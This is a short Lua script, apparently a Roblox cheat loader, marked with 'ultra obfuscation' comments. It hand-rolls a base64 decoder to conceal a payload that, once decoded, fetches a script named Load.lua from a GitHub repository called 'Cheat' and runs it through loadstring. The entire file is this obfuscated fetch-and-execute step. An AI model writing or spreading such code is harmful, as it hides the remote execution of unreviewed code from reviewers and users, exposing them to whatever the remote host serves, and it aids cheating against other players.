- ultra obfuscation start
local _c = string.char
local _b = string.byte
local _g = string.gsub

local function _decode64(d)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    d=_g(d,'[^'..b..'=]','')
    return (_g(d,'.',function(x)
        if x=='=' then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do
            r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0')
        end
        return r
    end):gsub('%d%d%d%d%d%d%d%d',function(x)
        return _c(tonumber(x,2))
    end))
end

local payload = "bG9hZHN0cmluZyhHYW1lOkh0dHBHZXRbMV0oIkh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9odXJvcHBhci9DaGVhdC9yZWZzL2hlYWRzL21haW4vTG9hZC5sdWEiKSkp"

local _L = loadstring or load
_L(_decode64(payload))()
-- ultra obfuscation end
